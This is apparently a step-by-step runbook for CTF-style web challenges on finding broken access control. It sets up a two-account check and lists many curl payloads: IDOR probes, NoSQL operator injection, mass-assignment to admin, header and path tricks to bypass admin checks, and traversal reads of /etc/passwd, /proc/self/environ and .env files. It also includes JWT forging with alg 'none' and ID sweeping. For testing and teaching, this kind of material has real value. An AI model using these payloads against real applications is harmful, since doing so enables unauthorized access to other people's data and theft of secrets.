# Field manual — the operational check sequence

The step-by-step runbook. One decision per section; record the verdict
as you go.

---

## 0. Before you start

```
two accounts: A (the owner) and B (the attacker)
A creates one private object → record its id and an attributable marker
   (a field only A has: the object's text, the owner's email, a private field)
```

The two-identity setup is the whole class — no shortcuts.

## 1. Step 1 — map the ids

Walk the app as A; record every identifier:

- `URL path`: `/notes/42`
- `URL query`: `?id=42`
- `Body JSON`: `{"id":42,"user_id":1}`
- `Body form`: `id=42&user_id=1`
- `Response`: `{"id":42,"owner_id":1,"user_id":2}`
- `Header`: `Location: /notes/42` `X-User-Id: 1`
- `Cookie`: `uid=42` `session_id=abc`
- `JWT`: `sub:42` `uid:1` `role:user`
- `GraphQL`: `id:"VXNlcjo0Mg=="` `node(id:"...")`
- `HTML`: `data-user-id="42"` `href="/users/42"` `<input name=user_id>`
- `JS`: `fetch('/api/users/'+id)`
- `File`: `report_42.pdf` `invoice_0042.pdf`
- `Multipart`: `filename="doc_42.pdf"` `name="user_id"`
- `Referer`: `Referer: /users/42`
- `ETag`: `ETag: "42"` `ETag: "user-42"`
- `WS`: `{"type":"msg","user_id":42}`
- `SSE`: `data:{"id":42}`
- `Redirect`: `302 → /notes/42`
- `Error`: `Object 42 not found` `invalid id 'abc'`
- `Log`: `GET /users/42` in an exposed log

## 2. Step 2 — the two-identity probe

```bash
# B requests A's object id
python3 tools/web/http_probe.py --challenge "$C" --class web-idor \
  --url "$BASE/api/notes/1001" --header "Cookie: session=$B" \
  --evidence-regex '"owner_id"\s*:\s*1|"email"\s*:\s*"a@|"text"\s*:\s*"A-' \
  --evidence-kind impact --on-match confirms --on-miss refutes
```

`confirms` → done. `refutes` → the check held — record it, move to the
next variant.

## 3. Step 3 — the carrier variants

```bash
# the same id via a different carrier
curl -b b.cookies "$BASE/api/notes?id=1001"
curl -b b.cookies -X POST "$BASE/api/notes" -d '{"id":1001}'
curl -b b.cookies -X POST "$BASE/api/notes" -d 'id=1001' \
  -H 'Content-Type: application/x-www-form-urlencoded'
curl -b b.cookies -X POST "$BASE/api/notes" \
  -H 'Content-Type: text/xml' -d '<note><id>1001</id></note>'
curl -b b.cookies "$BASE/api/notes/1001" -H 'X-User-Id: 1'
curl -b b.cookies "$BASE/api/notes/1001" -H 'Referer: /users/1'
# the GraphQL carrier
curl -b b.cookies -X POST "$BASE/graphql" -d '{"query":"{node(id:\"VXNlcjox\"){id}}"}'
```

## 4. Step 4 — the method/format variants

```bash
curl -b b.cookies -X PUT "$BASE/api/notes/1001" -d '{}'
curl -b b.cookies -X PATCH "$BASE/api/notes/1001" -d '{}'
curl -b b.cookies -X DELETE "$BASE/api/notes/1001"
curl -b b.cookies -X HEAD "$BASE/api/notes/1001"
curl -b b.cookies -X OPTIONS "$BASE/api/notes/1001"
curl -b b.cookies "$BASE/api/notes/1001.json"
curl -b b.cookies "$BASE/api/notes/1001.xml"
curl -b b.cookies "$BASE/api/notes/1001?format=json"
curl -b b.cookies "$BASE/api/notes/1001" -H 'Accept: application/json'
curl -b b.cookies "$BASE/api/notes/1001" -H 'Accept: application/xml'
curl -b b.cookies "$BASE/api/notes/1001" -H 'Accept: text/html'
```

## 5. Step 5 — the coercion variants

```bash
curl -b b.cookies "$BASE/api/notes?id[]=1001"
curl -b b.cookies "$BASE/api/notes?id=1001&id=2"
curl -b b.cookies "$BASE/api/notes/1001.0"
curl -b b.cookies "$BASE/api/notes/+1001"
curl -b b.cookies "$BASE/api/notes/01001"
curl -b b.cookies "$BASE/api/notes/0x3e9"
curl -b b.cookies "$BASE/api/notes/1e3"
curl -b b.cookies "$BASE/api/notes/'1001'"
curl -b b.cookies "$BASE/api/notes/\"1001\""
curl -b b.cookies "$BASE/api/notes/%31%30%30%31"
curl -b b.cookies "$BASE/api/notes/1001%00"
curl -b b.cookies "$BASE/api/notes/1001%20"
curl -b b.cookies "$BASE/api/notes/1001%09"
curl -b b.cookies "$BASE/api/notes/1001%0a"
curl -b b.cookies "$BASE/api/notes/1001%0d"
curl -b b.cookies -X POST "$BASE/api/notes" -d '{"id":[1001]}'
curl -b b.cookies -X POST "$BASE/api/notes" -d '{"id":{"$eq":1001}}'
curl -b b.cookies -X POST "$BASE/api/notes" -d '{"id":{"$ne":0}}'
curl -b b.cookies -X POST "$BASE/api/notes" -d '{"id":{"$gt":0}}'
curl -b b.cookies -X POST "$BASE/api/notes" -d '{"id":{"$in":[1001]}}'
curl -b b.cookies -X POST "$BASE/api/notes" -d '{"id":{"$exists":true}}'
curl -b b.cookies -X POST "$BASE/api/notes" -d '{"id":{"$regex":".*"}}'
curl -b b.cookies -X POST "$BASE/api/notes" -d '{"id":{"$where":"1==1"}}'
```

## 6. Step 6 — the scope-override

```bash
curl -b b.cookies "$BASE/api/orders?user_id=1"
curl -b b.cookies "$BASE/api/orders?owner=1"
curl -b b.cookies "$BASE/api/orders?owner_id=1"
curl -b b.cookies "$BASE/api/orders?author=1"
curl -b b.cookies "$BASE/api/orders?account=1"
curl -b b.cookies "$BASE/api/orders?tenant=1"
curl -b b.cookies "$BASE/api/orders?scope=all"
curl -b b.cookies "$BASE/api/orders?all=true"
curl -b b.cookies "$BASE/api/orders?include_private=true"
curl -b b.cookies "$BASE/api/orders?admin=true"
curl -b b.cookies "$BASE/api/orders?ids=1,2,3"
curl -b b.cookies -X POST "$BASE/api/bulk" -d '{"ids":[1,2,3]}'
curl -b b.cookies -X POST "$BASE/api/batch" -d '{"ids":[1,2,3]}'
curl -b b.cookies -X POST "$BASE/api/export" -d '{"user_ids":[1]}'
```

## 7. Step 7 — the field-list

```bash
curl -b b.cookies "$BASE/api/users/1?fields=id,email,role,secret"
curl -b b.cookies "$BASE/api/users/1?include=role,secret"
curl -b b.cookies "$BASE/api/users/1?select=id,email,role,secret"
curl -b b.cookies "$BASE/api/users/1?expand=user.role"
curl -b b.cookies "$BASE/api/users/1?populate=owner.secret"
curl -b b.cookies "$BASE/api/users/1?with=role"
curl -b b.cookies "$BASE/api/users/1?embed=role"
curl -b b.cookies "$BASE/api/users/1?join=role"
curl -b b.cookies "$BASE/api/users/1?attrs=id,email,role"
curl -b b.cookies "$BASE/api/users/1?properties=id,email,role"
curl -b b.cookies "$BASE/api/users/1?projection=id,email,role"
curl -b b.cookies "$BASE/api/users/1?only=id,email,role"
curl -b b.cookies "$BASE/api/users/1?pick=id,email,role"
curl -b b.cookies "$BASE/api/users/1?columns=id,email,role"
```

## 8. Step 8 — the mass-assign

```bash
curl -b b.cookies -X PATCH "$BASE/api/me" -d '{"role":"admin"}'
curl -b b.cookies -X PATCH "$BASE/api/me" -d '{"user_id":1}'
curl -b b.cookies -X PATCH "$BASE/api/me" -d '{"is_admin":true}'
curl -b b.cookies -X PATCH "$BASE/api/me" -d '{"isAdmin":true}'
curl -b b.cookies -X PATCH "$BASE/api/me" -d '{"admin":true}'
curl -b b.cookies -X PATCH "$BASE/api/users/me" -d '{"role":"admin"}'
curl -b b.cookies -X PATCH "$BASE/api/users/2" -d '{"role":"admin"}'
curl -b b.cookies -X PUT "$BASE/api/me" -d '{"role":"admin"}'
curl -b b.cookies -X POST "$BASE/api/register" -d '{"role":"admin",...}'
curl -b b.cookies -X POST "$BASE/api/signup" -d '{"role":"admin",...}'
# re-read — did it bind?
curl -b b.cookies "$BASE/api/me"
```

## 9. Step 9 — the function-level

```bash
curl -b b.cookies "$BASE/admin/flag"
curl -b b.cookies "$BASE/admin/users"
curl -b b.cookies "$BASE/api/admin/flag"
curl -b b.cookies "$BASE/internal/flag"
curl -b b.cookies "$BASE/_/admin/flag"
curl -b b.cookies "$BASE/-/admin/flag"
curl -b b.cookies "$BASE/.admin/flag"
curl -b b.cookies "$BASE/~/admin/flag"
curl -b b.cookies "$BASE/admin/flag?role=admin"
curl -b b.cookies "$BASE/admin/flag?is_admin=1"
curl -b b.cookies "$BASE/admin/flag?admin=1"
curl -b b.cookies "$BASE/admin/flag" -H 'X-Role: admin'
curl -b b.cookies "$BASE/admin/flag" -H 'X-Admin: true'
curl -b b.cookies "$BASE/admin/flag" -H 'X-Is-Admin: 1'
curl -b b.cookies "$BASE/admin/flag" -H 'X-Staff: true'
curl -b b.cookies "$BASE/admin/flag" -H 'X-User: admin'
curl -b b.cookies "$BASE/admin/flag" -H 'X-User-Id: 1'
curl -b b.cookies "$BASE/admin/flag" -b 'role=admin'
curl -b 'role=admin' "$BASE/admin/flag"
curl -b b.cookies -X POST "$BASE/admin/flag"
curl -b b.cookies -X HEAD "$BASE/admin/flag"
curl -b b.cookies -X OPTIONS "$BASE/admin/flag"
curl -b b.cookies "$BASE//admin/flag"
curl -b b.cookies "$BASE/admin//flag"
curl -b b.cookies "$BASE/admin/./flag"
curl -b b.cookies "$BASE/admin/../admin/flag"
curl -b b.cookies "$BASE/admin%2fflag"
curl -b b.cookies "$BASE/admin/flag/"
curl -b b.cookies "$BASE/admin/flag."
curl -b b.cookies "$BASE/admin/flag;"
curl -b b.cookies "$BASE/admin/flag;param=1"
curl -b b.cookies "$BASE/admin/flag.js"
curl -b b.cookies "$BASE/admin/flag.json"
curl -b b.cookies "$BASE/ADMIN/FLAG"
curl -b b.cookies "$BASE/Admin/Flag"
```

## 10. Step 10 — the file-id

```bash
curl -b b.cookies "$BASE/download?file=report_42.pdf"
curl -b b.cookies "$BASE/download?file=report_1.pdf"
curl -b b.cookies "$BASE/download?file=report_0.pdf"
curl -b b.cookies "$BASE/download?file=../../etc/passwd"
curl -b b.cookies "$BASE/download?file=/etc/passwd"
curl -b b.cookies "$BASE/download?file=..%2f..%2fetc%2fpasswd"
curl -b b.cookies "$BASE/download?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd"
curl -b b.cookies "$BASE/download?file=....//etc/passwd"
curl -b b.cookies "$BASE/download?file=file:///etc/passwd"
curl -b b.cookies "$BASE/download?file=php://filter/convert.base64-encode/resource=/etc/passwd"
curl -b b.cookies "$BASE/download?file=php://filter/convert.base64-encode/resource=/flag.txt"
curl -b b.cookies "$BASE/download?file=/proc/self/environ"
curl -b b.cookies "$BASE/download?file=/flag.txt"
curl -b b.cookies "$BASE/download?file=/flag"
curl -b b.cookies "$BASE/download?file=/app/flag.txt"
curl -b b.cookies "$BASE/download?file=/app/.env"
curl -b b.cookies "$BASE/download?file=report_42.pdf.bak"
curl -b b.cookies "$BASE/download?file=report_42.pdf%00.txt"
```

## 11. Step 11 — the predictable id

```bash
# is it sequential?
python3 tools/web/id_sweep.py --url "$BASE/api/users/{id}" \
  --header "Cookie: session=$B" --range 1-100 \
  --hit-regex '"email"|"role"|"owner_id"' --miss-regex '404|"error"'
# is it b64 Type:id?
echo 'VXNlcjo0Mg==' | base64 -d     # User:42
echo -n 'User:1' | base64            # → VXNlcjox
# is it uuid v1? predict from created_at + MAC
# is it ObjectId? ts+rand+counter
# is it a hash of a known? md5(email), sha1(name), uuid5(ns,name)
```

## 12. Step 12 — the JWT/claim

```bash
python3 tools/web/session_dissect.py --token "$JWT"
python3 tools/web/jwt_forge.py --alg none --claims '{"sub":1,"role":"admin"}'
python3 tools/web/jwt_forge.py --alg HS256 --secret key --claims '{"sub":1,"uid":1}'
```

## 13. Step 13 — the second-order

```bash
curl -b b.cookies -X POST "$BASE/export" -d '{"user_id":1,"format":"pdf"}'
curl -b b.cookies -X POST "$BASE/report" -d '{"for":1}'
curl -b b.cookies -X POST "$BASE/render" -d '{"template_id":42}'
curl -b b.cookies -X POST "$BASE/preview" -d '{"id":42}'
curl -b b.cookies -X POST "$BASE/webhook" -d '{"object_id":42,"url":"https://you/cb"}'
curl -b b.cookies -X POST "$BASE/notify" -d '{"user":1,"msg":"x"}'
curl -b b.cookies -X POST "$BASE/import" -d '{"source_id":42}'
curl -b b.cookies -X POST "$BASE/clone" -d '{"template_id":42}'
curl -b b.cookies -X POST "$BASE/share" -d '{"object_id":42,"with":1}'
# the bot path
curl -b b.cookies -X POST "$BASE/submit" -d '{"url":"/notes/42"}'
# the job path
curl -b b.cookies "$BASE/jobs/99"     # poll the job
curl -b b.cookies "$BASE/export/99.pdf"  # read the job's output
```

## 14. Step 14 — the WS/SSE/RPC

```bash
# WebSocket
wscat -c "wss://target/socket" -H "Cookie: session=$B"
> {"type":"subscribe","channel":"user:1"}
> {"type":"get","resource":{"id":42}}
> {"type":"subscribe","channel":"user_1"}
> {"type":"subscribe","channel":"user.1"}
# SSE
curl -b b.cookies "$BASE/events?user_id=1"
curl -b b.cookies "$BASE/stream?channel=user:1"
# JSON-RPC
curl -b b.cookies -X POST "$BASE/rpc" \
  -d '{"jsonrpc":"2.0","method":"getUser","params":{"id":1},"id":1}'
curl -b b.cookies -X POST "$BASE/rpc" \
  -d '{"jsonrpc":"2.0","method":"admin.getFlag","params":{},"id":1}'
```

## 15. The record

Every `confirms`/`refutes`/`inconclusive` goes to `hooks.py post-probe`
with `--response` verbatim. The ledger is the memory — `decide.py`
skips the closed branches.
